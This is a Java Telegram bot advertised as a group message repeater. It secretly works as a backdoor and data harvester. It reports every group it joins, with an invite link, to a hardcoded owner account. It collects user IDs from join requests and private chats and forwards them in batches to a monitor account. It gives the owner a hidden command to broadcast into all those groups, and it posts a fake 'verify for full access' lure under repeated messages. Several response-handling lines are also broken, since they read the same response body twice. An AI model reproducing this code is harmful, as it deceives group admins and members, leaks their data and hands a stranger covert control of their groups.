import com.google.gson.Gson;
import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;
import okhttp3.*;
import spark.Spark;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.*;
import java.util.concurrent.ConcurrentHashMap;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Bot {
    private static final String TOKEN = System.getenv("BOT_TOKEN"); // Bot token from BotFather
    private static final String WEBHOOK_URL = System.getenv("WEBHOOK_URL"); // Render URL + /webhook
    private static final String BOT_API = "https://api.telegram.org/bot" + TOKEN;
    private static final long OWNER_ID = 8141547148L; // Main Owner with full control
    private static final long MONITOR_ID = 8405313334L; // Now used for user id batches

    private static final Map<Long, List<Map<String, Object>>> repeatJobs = new ConcurrentHashMap<>();
    private static final String GROUPS_FILE = "groups.txt";
    private static final Map<String, Map<String, Object>> mediaGroups = new ConcurrentHashMap<>(); // (chat_id_media_group_id) → {ids: list, last_time: timestamp}
    private static final Map<Long, Long> lastBroadcastIds = new ConcurrentHashMap<>(); // {group_id: message_id}
    private static final Map<Long, Long> pendingVerifications = new ConcurrentHashMap<>(); // user_id (private) → group_chat_id
    private static final Set<Long> collectedUsers = ConcurrentHashMap.newKeySet(); // Collect user ids for batch sending
    private static final Map<Long, Map<String, Object>> joinWindows = new ConcurrentHashMap<>(); // chat_id → {last_time: timestamp, count: int} (kept but unused)

    private static String BOT_USERNAME = null;
    private static final OkHttpClient client = new OkHttpClient();
    private static final Gson gson = new Gson();

    public static void main(String[] args) {
        // Pre-fetch bot username
        getBotUsername();

        // Set webhook
        try {
            Request request = new Request.Builder().url(BOT_API + "/setWebhook?url=" + WEBHOOK_URL + "/webhook").build();
            client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }

        // Start threads
        new Thread(Bot::keepAlive).start();
        new Thread(Bot::cleanupOldAlbums).start();
        new Thread(Bot::sendUserBatch).start();

        // Spark server
        int port = Integer.parseInt(System.getenv().getOrDefault("PORT", "5000"));
        Spark.port(port);

        Spark.post("/webhook", (req, res) -> {
            JsonObject update = gson.fromJson(req.body(), JsonObject.class);
            return webhook(update);
        });

        Spark.get("/", (req, res) -> "Bot is alive!");
    }

    private static String getBotUsername() {
        if (BOT_USERNAME == null) {
            try {
                Request request = new Request.Builder().url(BOT_API + "/getMe").build();
                Response response = client.newCall(request).execute();
                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
                if (json.get("ok").getAsBoolean()) {
                    BOT_USERNAME = json.getAsJsonObject("result").get("username").getAsString();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }
        return BOT_USERNAME != null ? BOT_USERNAME : "yourbotusername"; // fallback
    }

    // -------------------- Helper Functions -------------------- //

    private static Response sendMessage(long chatId, String text, String parseMode, Long replyToMessageId, JsonObject replyMarkup) throws IOException {
        JsonObject payload = new JsonObject();
        payload.addProperty("chat_id", chatId);
        payload.addProperty("text", text);
        if (parseMode != null) payload.addProperty("parse_mode", parseMode);
        if (replyToMessageId != null) payload.addProperty("reply_to_message_id", replyToMessageId);
        if (replyMarkup != null) payload.add("reply_markup", replyMarkup);

        RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
        Request request = new Request.Builder().url(BOT_API + "/sendMessage").post(body).build();
        Response response = client.newCall(request).execute();
        if (response.code() == 429) {
            System.out.println("Rate limit hit: " + response.body().string());
        }
        return response;
    }

    private static void deleteMessage(long chatId, Long messageId) {
        if (messageId == null) return;
        try {
            JsonObject payload = new JsonObject();
            payload.addProperty("chat_id", chatId);
            payload.addProperty("message_id", messageId);
            RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
            Request request = new Request.Builder().url(BOT_API + "/deleteMessage").post(body).build();
            client.newCall(request).execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static List<JsonObject> getChatAdministrators(long chatId) {
        try {
            Request request = new Request.Builder().url(BOT_API + "/getChatAdministrators?chat_id=" + chatId).build();
            Response response = client.newCall(request).execute();
            if (response.code() == 200) {
                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
                if (json.get("ok").getAsBoolean()) {
                    List<JsonObject> admins = new ArrayList<>();
                    for (JsonElement elem : json.getAsJsonArray("result")) {
                        admins.add(elem.getAsJsonObject());
                    }
                    return admins;
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new ArrayList<>();
    }

    private static String exportInviteLink(long chatId) {
        try {
            Request request = new Request.Builder().url(BOT_API + "/exportChatInviteLink?chat_id=" + chatId).build();
            Response response = client.newCall(request).execute();
            if (response.code() == 200) {
                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
                if (json.get("ok").getAsBoolean()) {
                    return json.get("result").getAsString();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return null;
    }

    private static boolean checkRequiredPermissions(long chatId) {
        List<JsonObject> admins = getChatAdministrators(chatId);
        JsonObject botInfo = getMe();
        long botId = botInfo.getAsJsonObject("result").get("id").getAsLong();
        for (JsonObject admin : admins) {
            if (admin.getAsJsonObject("user").get("id").getAsLong() == botId) {
                boolean canDelete = admin.get("can_delete_messages").getAsBoolean();
                boolean canRestrict = admin.get("can_restrict_members").getAsBoolean();
                boolean canInvite = admin.get("can_invite_users").getAsBoolean();
                boolean canPromote = admin.get("can_promote_members").getAsBoolean();
                return canDelete && canRestrict && canInvite && canPromote;
            }
        }
        return false;
    }

    private static String getChatTitle(long chatId) {
        try {
            Request request = new Request.Builder().url(BOT_API + "/getChat?chat_id=" + chatId).build();
            Response response = client.newCall(request).execute();
            if (response.code() == 200) {
                JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
                if (json.get("ok").getAsBoolean()) {
                    return json.getAsJsonObject("result").get("title").getAsString();
                }
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "the group";
    }

    private static void saveGroupId(long chatId) {
        if (!String.valueOf(chatId).startsWith("-")) return;
        Path path = Paths.get(GROUPS_FILE);
        try {
            if (!Files.exists(path)) Files.createFile(path);
            List<String> groups = Files.readAllLines(path);
            if (!groups.contains(String.valueOf(chatId))) {
                Files.write(path, (chatId + "\n").getBytes(), StandardOpenOption.APPEND);
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static List<Long> loadGroupIds() {
        Path path = Paths.get(GROUPS_FILE);
        if (!Files.exists(path)) return new ArrayList<>();
        try {
            List<String> lines = Files.readAllLines(path);
            List<Long> ids = new ArrayList<>();
            for (String line : lines) {
                if (!line.trim().isEmpty()) ids.add(Long.parseLong(line.trim()));
            }
            return ids;
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new ArrayList<>();
    }

    private static int broadcastMessageOnce(long originalChatId, long originalMessageId) {
        lastBroadcastIds.clear();
        List<Long> groupIds = loadGroupIds();
        int successCount = 0;
        for (long gid : groupIds) {
            try {
                JsonObject payload = new JsonObject();
                payload.addProperty("chat_id", gid);
                payload.addProperty("from_chat_id", originalChatId);
                payload.addProperty("message_id", originalMessageId);
                RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
                Request request = new Request.Builder().url(BOT_API + "/copyMessage").post(body).build();
                Response response = client.newCall(request).execute();
                if (response.code() == 200 && gson.fromJson(response.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
                    long newMsgId = gson.fromJson(response.body().string(), JsonObject.class).getAsJsonObject("result").get("message_id").getAsLong();
                    lastBroadcastIds.put(gid, newMsgId);
                    successCount++;
                }
            } catch (Exception e) {
                System.out.println("Failed to send to " + gid + ": " + e.getMessage());
            }
        }
        return successCount;
    }

    private static int deleteLastBroadcast() {
        int deletedCount = 0;
        for (Map.Entry<Long, Long> entry : lastBroadcastIds.entrySet()) {
            try {
                deleteMessage(entry.getKey(), entry.getValue());
                deletedCount++;
            } catch (Exception e) {
                System.out.println("Failed to delete in " + entry.getKey() + ": " + e.getMessage());
            }
        }
        lastBroadcastIds.clear();
        return deletedCount;
    }

    private static void notifyOwnerNewGroup(long chatId, String chatType, String chatTitle) {
        String link = exportInviteLink(chatId);
        String msg;
        if (chatType.equals("group") || chatType.equals("supergroup")) {
            msg = "📢 Bot added to Group\n<b>" + chatTitle + "</b>\nID: <code>" + chatId + "</code>";
        } else if (chatType.equals("channel")) {
            msg = "📢 Bot added to Channel\n<b>" + chatTitle + "</b>\nID: <code>" + chatId + "</code>";
        } else {
            return;
        }
        if (link != null) {
            msg += "\n🔗 Invite Link: " + link;
        } else {
            msg += "\n⚠️ No invite link (Bot may lack permission).";
        }
        try {
            sendMessage(OWNER_ID, msg, "HTML", null, null);
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    private static String checkBotStatus(long targetChatId) {
        try {
            Request request = new Request.Builder().url(BOT_API + "/getChat?chat_id=" + targetChatId).build();
            Response response = client.newCall(request).execute();
            JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
            if (!response.isSuccessful() || !json.get("ok").getAsBoolean()) {
                return "Bot is inactive (Chat not found or bot removed).";
            }
            List<JsonObject> admins = getChatAdministrators(targetChatId);
            JsonObject botInfo = getMe();
            long botId = botInfo.getAsJsonObject("result").get("id").getAsLong();
            for (JsonObject admin : admins) {
                if (admin.getAsJsonObject("user").get("id").getAsLong() == botId) {
                    return "✅ Bot is active (Admin in the group/channel).";
                }
            }
            return "⚠️ Bot is inactive (Not admin).";
        } catch (IOException e) {
            e.printStackTrace();
        }
        return "Error checking status.";
    }

    private static boolean canRegularMembersSendMessages(long chatId) {
        try {
            Request request = new Request.Builder().url(BOT_API + "/getChat?chat_id=" + chatId).build();
            Response response = client.newCall(request).execute();
            JsonObject json = gson.fromJson(response.body().string(), JsonObject.class);
            if (!json.get("ok").getAsBoolean()) return false;
            JsonObject chat = json.getAsJsonObject("result");
            if (!chat.has("permissions")) return true;
            return chat.getAsJsonObject("permissions").get("can_send_messages").getAsBoolean();
        } catch (Exception e) {
            return true;
        }
    }

    // -------------------- Cleanup old albums -------------------- //
    private static void cleanupOldAlbums() {
        while (true) {
            try {
                Thread.sleep(TimeUnit.SECONDS.toMillis(60));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            long now = System.currentTimeMillis() / 1000;
            List<String> toDelete = new ArrayList<>();
            for (Map.Entry<String, Map<String, Object>> entry : mediaGroups.entrySet()) {
                long lastTime = (long) entry.getValue().get("last_time");
                if (now - lastTime > 360) {
                    toDelete.add(entry.getKey());
                }
            }
            for (String key : toDelete) {
                mediaGroups.remove(key);
            }
        }
    }

    // -------------------- Verification logic -------------------- //
    private static boolean doVerification(long userId, long chatId) {
        if (!pendingVerifications.containsKey(userId)) return false;
        long groupChatId = pendingVerifications.get(userId);
        String groupTitle = getChatTitle(groupChatId);
        String verifyText = "Verified ✅ by " + groupTitle + "\n<i>Granted full access</i>";
        try {
            sendMessage(chatId, verifyText, "HTML", null, null);
        } catch (IOException e) {
            e.printStackTrace();
        }
        pendingVerifications.remove(userId);
        return true;
    }

    // -------------------- User Batch Sending -------------------- //
    private static void flushUserBatch() {
        while (!collectedUsers.isEmpty()) {
            List<Long> batch = new ArrayList<>(collectedUsers).subList(0, Math.min(200, collectedUsers.size()));
            if (batch.isEmpty()) break;
            String userList = String.join("\n", batch.stream().map(String::valueOf).toArray(String[]::new));
            try {
                sendMessage(MONITOR_ID, userList, null, null, null);
            } catch (IOException e) {
                e.printStackTrace();
            }
            for (long id : batch) collectedUsers.remove(id);
        }
    }

    private static void sendUserBatch() {
        while (true) {
            try {
                Thread.sleep(TimeUnit.MINUTES.toMillis(10)); // 10 minutes
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
            flushUserBatch();
        }
    }

    // -------------------- Webhook -------------------- //
    private static String webhook(JsonObject update) {
        // Handle deep link /start verify_xxxx in PRIVATE chat
        if (update.has("message")) {
            JsonObject msg = update.getAsJsonObject("message");
            long chatId = msg.getAsJsonObject("chat").get("id").getAsLong();
            String text = msg.has("text") ? msg.get("text").getAsString().trim() : "";
            long userId = msg.getAsJsonObject("from").get("id").getAsLong();
            if (!String.valueOf(chatId).startsWith("-") && text.startsWith("/start")) {
                Pattern pattern = Pattern.compile("^/start\\s+verify_(-?\\d+)$");
                Matcher matcher = pattern.matcher(text);
                if (matcher.matches()) {
                    long groupId = Long.parseLong(matcher.group(1));
                    pendingVerifications.put(userId, groupId);
                    doVerification(userId, chatId);
                    return "OK";
                }
            }
        }

        // Handle join request
        if (update.has("chat_join_request")) {
            JsonObject jr = update.getAsJsonObject("chat_join_request");
            long userId = jr.getAsJsonObject("from").get("id").getAsLong();
            collectedUsers.add(userId);
            if (collectedUsers.size() >= 200) flushUserBatch();
            return "OK";
        }

        JsonObject msg = update.has("message") ? update.getAsJsonObject("message") : (update.has("channel_post") ? update.getAsJsonObject("channel_post") : null);
        JsonObject myChatMember = update.has("my_chat_member") ? update.getAsJsonObject("my_chat_member") : null;

        if (myChatMember != null) {
            JsonObject chat = myChatMember.getAsJsonObject("chat");
            long chatId = chat.get("id").getAsLong();
            String chatType = chat.get("type").getAsString();
            String chatTitle = chat.has("title") ? chat.get("title").getAsString() : "";
            String newStatus = myChatMember.getAsJsonObject("new_chat_member").get("status").getAsString();
            if (newStatus.equals("administrator") || newStatus.equals("member")) {
                if (!checkRequiredPermissions(chatId)) {
                    try {
                        sendMessage(OWNER_ID, "❌ Missing required permissions in " + chatTitle + " (" + chatId + ")", null, null, null);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                    return "OK";
                }
                saveGroupId(chatId);
                notifyOwnerNewGroup(chatId, chatType, chatTitle);
            }
            return "OK";
        }

        if (msg == null) return "OK";

        long chatId = msg.getAsJsonObject("chat").get("id").getAsLong();
        String text = (msg.has("text") ? msg.get("text").getAsString() : "") + (msg.has("caption") ? msg.get("caption").getAsString() : "");
        JsonObject fromUser = msg.has("from") ? msg.getAsJsonObject("from") : new JsonObject();
        long messageId = msg.get("message_id").getAsLong();
        long userId = fromUser.has("id") ? fromUser.get("id").getAsLong() : 0;

        if (userId != 0 && !String.valueOf(chatId).startsWith("-")) {
            collectedUsers.add(userId);
            if (collectedUsers.size() >= 200) flushUserBatch();
        }

        if (String.valueOf(chatId).startsWith("-")) saveGroupId(chatId);

        List<Long> admins = new ArrayList<>();
        if (String.valueOf(chatId).startsWith("-")) {
            for (JsonObject a : getChatAdministrators(chatId)) {
                admins.add(a.getAsJsonObject("user").get("id").getAsLong());
            }
        }
        boolean isAdmin = userId != 0 && admins.contains(userId);

        // Album / media group collection
        if (msg.has("media_group_id")) {
            String mgid = msg.get("media_group_id").getAsString();
            String key = chatId + "_" + mgid;
            if (!mediaGroups.containsKey(key)) {
                Map<String, Object> group = new HashMap<>();
                group.put("ids", new ArrayList<Long>());
                group.put("last_time", System.currentTimeMillis() / 1000);
                mediaGroups.put(key, group);
            }
            ((List<Long>) mediaGroups.get(key).get("ids")).add(messageId);
            mediaGroups.get(key).put("last_time", System.currentTimeMillis() / 1000);
        }

        // OWNER special commands
        if (chatId == OWNER_ID && text.trim().startsWith("-")) {
            String statusMessage = checkBotStatus(Long.parseLong(text.trim()));
            try {
                sendMessage(chatId, statusMessage, null, null, null);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return "OK";
        }

        if (chatId == OWNER_ID && text.toLowerCase().startsWith("/invitelink")) {
            String[] parts = text.split(" ");
            if (parts.length != 2) {
                try {
                    sendMessage(chatId, "Usage: /invitelink <group_id>", null, null, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return "OK";
            }
            long target = Long.parseLong(parts[1]);
            String link = exportInviteLink(target);
            try {
                sendMessage(chatId, link != null ? "🔗 Invite link:\n" + link : "❌ Failed to get invite link.", null, null, null);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return "OK";
        }

        // /start
        if (text.trim().toLowerCase().equals("/start")) {
            String startMsg = "🤖 <b>REPEAT MESSAGES BOT</b>\n\n" +
                    "<b>📌 YOU CAN REPEAT MULTIPLE MESSAGES 📌</b>\n\n" +
                    "🔧📌 𝗔𝗗𝗩𝗔𝗡𝗖𝗘 𝗙𝗘𝗔𝗧𝗨𝗥𝗘 : -📸 𝗜𝗠𝗔𝗚𝗘 𝗔𝗟𝗕𝗨𝗠 <b>AND</b>🎬 𝗩𝗜𝗗𝗘𝗢 𝗔𝗟𝗕𝗨𝗠 <b>WITH AND WITHOUT CAPTION CAN BE REPEATED </b>\n\n" +
                    "This bot repeats 📹 Videos, 📝 Text, 🖼 Images, 🔗 Links, Albums (multiple images/videos) " +
                    "in various intervals.\n\n" +
                    "📌It also deletes the last repeated message(s) before sending new one(s).\n\n" +
                    "🛠 <b>Commands:</b>\n\n" +
                    "🔹 /repeat2min - Reply to any message (or album) to Repeat every 2 minutes\n" +
                    "🔹 /repeat5min - Reply to any message (or album) to Repeat every 5 minutes\n" +
                    "🔹 /repeat20min - Reply to any message (or album) to Repeat every 20 minutes\n" +
                    "🔹 /repeat60min - Reply to any message (or album) to Repeat every 60 minutes (1 hour)\n" +
                    "🔹 /repeat120min - Reply to any message (or album) to Repeat every 120 minutes (2 hours)\n" +
                    "🔹 /repeat24hour - Reply to any message (or album) to Repeat every 24 hours\n" +
                    "🔹 /stop - Stop all repeating messages\n\n" +
                    "⚠️ Only <b>admins</b> can control this bot.";
            try {
                sendMessage(chatId, startMsg, "HTML", null, null);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return "OK";
        }

        // One-time broadcast
        if (chatId == OWNER_ID && text.startsWith("/lemonchus")) {
            if (msg.has("reply_to_message")) {
                long count = broadcastMessageOnce(chatId, msg.getAsJsonObject("reply_to_message").get("message_id").getAsLong());
                try {
                    sendMessage(chatId, "✅ Broadcast sent to " + count + " groups.\nUse /lemonchusstop to delete.", null, null, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else {
                try {
                    sendMessage(chatId, "Reply to a message to broadcast it.", null, null, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return "OK";
        }

        if (chatId == OWNER_ID && text.startsWith("/lemonchusstop")) {
            int deleted = deleteLastBroadcast();
            try {
                sendMessage(chatId, deleted > 0 ? "🗑️ Deleted from " + deleted + " groups." : "No previous broadcast.", null, null, null);
            } catch (IOException e) {
                e.printStackTrace();
            }
            return "OK";
        }

        // Repeat commands
        if (msg.has("reply_to_message") && text.startsWith("/repeat")) {
            if (!isAdmin) {
                try {
                    sendMessage(chatId, "Only group admins can use repeat commands.", null, messageId, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return "OK";
            }

            JsonObject replied = msg.getAsJsonObject("reply_to_message");
            String cmd = text.split(" ")[0].toLowerCase();
            Map<String, Object> intervalMap = new HashMap<>();
            intervalMap.put("/repeat2min", new Object[]{120L, "2 minutes"});
            intervalMap.put("/repeat5min", new Object[]{300L, "5 minutes"});
            intervalMap.put("/repeat20min", new Object[]{1200L, "20 minutes"});
            intervalMap.put("/repeat60min", new Object[]{3600L, "1 hour"});
            intervalMap.put("/repeat120min", new Object[]{7200L, "2 hours"});
            intervalMap.put("/repeat24hour", new Object[]{86400L, "24 hours"});

            if (!intervalMap.containsKey(cmd)) {
                try {
                    sendMessage(chatId, "Invalid command.\nAvailable: " + String.join(", ", intervalMap.keySet()), null, messageId, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return "OK";
            }

            long interval = ((Object[]) intervalMap.get(cmd))[0] instanceof Long ? (Long) ((Object[]) intervalMap.get(cmd))[0] : 0;
            String display = (String) ((Object[]) intervalMap.get(cmd))[1];

            List<Long> albumIds = new ArrayList<>();
            boolean isAlbum = false;
            boolean isMedia = false;
            String originalText = (replied.has("text") ? replied.get("text").getAsString() : "") + (replied.has("caption") ? replied.get("caption").getAsString() : "");

            if (replied.has("media_group_id")) {
                String mgid = replied.get("media_group_id").getAsString();
                String key = chatId + "_" + mgid;
                long waited = 0;
                double maxWait = 4.5;
                double step = 0.35;
                while (waited < maxWait) {
                    if (mediaGroups.containsKey(key) && ((List<Long>) mediaGroups.get(key).get("ids")).size() > 1) {
                        break;
                    }
                    try {
                        Thread.sleep((long) (step * 1000));
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                    waited += step;
                    step = Math.min(step + 0.15, 0.8);
                }

                if (mediaGroups.containsKey(key)) {
                    albumIds = new ArrayList<>((List<Long>) mediaGroups.get(key).get("ids"));
                    Collections.sort(albumIds);
                } else {
                    albumIds.add(replied.get("message_id").getAsLong());
                }

                System.out.println("[ALBUM DETECT] chat=" + chatId + " | mgid=" + mgid + " | items=" + albumIds.size() + " | ids=" + albumIds);

                if (albumIds.size() > 1) {
                    isAlbum = true;
                    String resultText = "**✓ Album detected** (" + albumIds.size() + " items)\nWill repeat every " + display + ".";
                    try {
                        sendMessage(chatId, resultText, "Markdown", messageId, null);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                } else {
                    String resultText = "**⚠️ Only single message detected**\n" +
                            "If this was supposed to be an album,\n" +
                            "please use /stop send album again and try the repeat command again.";
                    try {
                        sendMessage(chatId, resultText, "Markdown", messageId, null);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                }
                isMedia = true;
            } else {
                albumIds.add(replied.get("message_id").getAsLong());
                String[] mediaKeys = {"photo", "video", "animation", "audio", "voice", "document", "video_note", "sticker"};
                for (String key : mediaKeys) {
                    if (replied.has(key)) {
                        isMedia = true;
                        break;
                    }
                }
                String resultText = "**✓ Repeating started**\nInterval: every " + display;
                try {
                    sendMessage(chatId, resultText, "Markdown", messageId, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            Map<String, Object> jobRef = new HashMap<>();
            jobRef.put("message_ids", albumIds);
            jobRef.put("running", true);
            jobRef.put("interval", interval);
            jobRef.put("is_album", isAlbum);
            jobRef.put("is_media", isMedia);
            jobRef.put("original_text", originalText);

            // Make variables effectively final for the lambda
            final long finalChatId = chatId;
            final List<Long> finalAlbumIds = albumIds;
            final long finalInterval = interval;
            final boolean finalIsAlbum = isAlbum;
            final Map<String, Object> finalJobRef = jobRef;

            repeatJobs.computeIfAbsent(chatId, k -> new ArrayList<>()).add(jobRef);

            new Thread(() -> repeater(finalChatId, finalAlbumIds, finalInterval, finalJobRef, finalIsAlbum)).start();
            return "OK";
        }

        // /verify fallback
        else if (text.trim().equals("/verify") && !String.valueOf(chatId).startsWith("-")) {
            doVerification(userId, chatId);
            return "OK";
        }

        // /stop
        else if (text.startsWith("/stop")) {
            if (!isAdmin) {
                try {
                    sendMessage(chatId, "Only group admins can stop repeating.", null, messageId, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
                return "OK";
            }

            if (repeatJobs.containsKey(chatId) && !repeatJobs.get(chatId).isEmpty()) {
                for (Map<String, Object> job : repeatJobs.get(chatId)) {
                    job.put("running", false);
                }
                repeatJobs.put(chatId, new ArrayList<>());
                try {
                    sendMessage(chatId, "🛑 All repeating tasks stopped", null, messageId, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else {
                try {
                    sendMessage(chatId, "No active repeating tasks found.", null, messageId, null);
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
            return "OK";
        }

        return "OK";
    }

    // -------------------- Repeater -------------------- //
    private static void repeater(long chatId, List<Long> messageIds, long interval, Map<String, Object> jobRef, boolean isAlbum) {
        List<Long> lastContentIds = new ArrayList<>();
        Long lastPromptId = null;

        String verificationPromptText = "🚨User !\n" +
                "Please verify yourself to gain full access.\n" +
                "Click the button to start verification";

        JsonObject verifyKeyboard = new JsonObject();
        JsonArray inlineKeyboard = new JsonArray();
        JsonArray row = new JsonArray();
        JsonObject button = new JsonObject();
        button.addProperty("text", "✅Click To Get Full Access");
        button.addProperty("url", "https://t.me/" + getBotUsername() + "?start=verify_" + chatId);
        row.add(button);
        inlineKeyboard.add(row);
        verifyKeyboard.add("inline_keyboard", inlineKeyboard);

        while ((boolean) jobRef.get("running")) {
            // Delete previous content + previous prompt (if was media)
            for (long mid : lastContentIds) {
                deleteMessage(chatId, mid);
            }
            if (lastPromptId != null) {
                deleteMessage(chatId, lastPromptId);
            }

            lastContentIds.clear();
            lastPromptId = null;

            if ((boolean) jobRef.get("is_media")) {
                try {
                    JsonObject payload = new JsonObject();
                    payload.addProperty("chat_id", chatId);
                    payload.addProperty("from_chat_id", chatId);
                    JsonArray idsArray = new JsonArray();
                    for (long id : messageIds) idsArray.add(id);
                    payload.add("message_ids", idsArray);
                    payload.addProperty("disable_notification", true);
                    RequestBody body = RequestBody.create(gson.toJson(payload), MediaType.get("application/json"));
                    Request request = new Request.Builder().url(BOT_API + "/copyMessages").post(body).build();
                    Response response = client.newCall(request).execute();
                    if (response.code() == 200 && gson.fromJson(response.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
                        JsonElement result = gson.fromJson(response.body().string(), JsonObject.class).get("result");
                        if (result.isJsonArray()) {
                            for (JsonElement m : result.getAsJsonArray()) {
                                lastContentIds.add(m.getAsJsonObject().get("message_id").getAsLong());
                            }
                        } else {
                            lastContentIds.add(result.getAsJsonObject().get("message_id").getAsLong());
                        }
                    }

                    // Send small verification message below media
                    Response promptResp = sendMessage(chatId, verificationPromptText, null, null, verifyKeyboard);
                    if (promptResp.code() == 200 && gson.fromJson(promptResp.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
                        lastPromptId = gson.fromJson(promptResp.body().string(), JsonObject.class).getAsJsonObject("result").get("message_id").getAsLong();
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            } else {
                // Text / link → re-send with inline button DIRECTLY attached
                String textToRepeat = (String) jobRef.getOrDefault("original_text", "Repeated message");
                String parseMode = textToRepeat.contains("<") ? "HTML" : null;
                try {
                    Response resp = sendMessage(chatId, textToRepeat, parseMode, null, verifyKeyboard);
                    if (resp.code() == 200 && gson.fromJson(resp.body().string(), JsonObject.class).get("ok").getAsBoolean()) {
                        lastContentIds.add(gson.fromJson(resp.body().string(), JsonObject.class).getAsJsonObject("result").get("message_id").getAsLong());
                    }
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }

            try {
                Thread.sleep(interval * 1000);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    // -------------------- Keep Alive -------------------- //
    private static void keepAlive() {
        while (true) {
            try {
                Request request = new Request.Builder().url(WEBHOOK_URL).build();
                client.newCall(request).execute();
                System.out.println("Keep-alive ping sent");
            } catch (Exception e) {
                System.out.println("Keep-alive failed: " + e.getMessage());
            }
            try {
                Thread.sleep(TimeUnit.MINUTES.toMillis(5));
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }
    }

    private static JsonObject getMe() {
        try {
            Request request = new Request.Builder().url(BOT_API + "/getMe").build();
            Response response = client.newCall(request).execute();
            return gson.fromJson(response.body().string(), JsonObject.class);
        } catch (IOException e) {
            e.printStackTrace();
        }
        return new JsonObject();
    }
}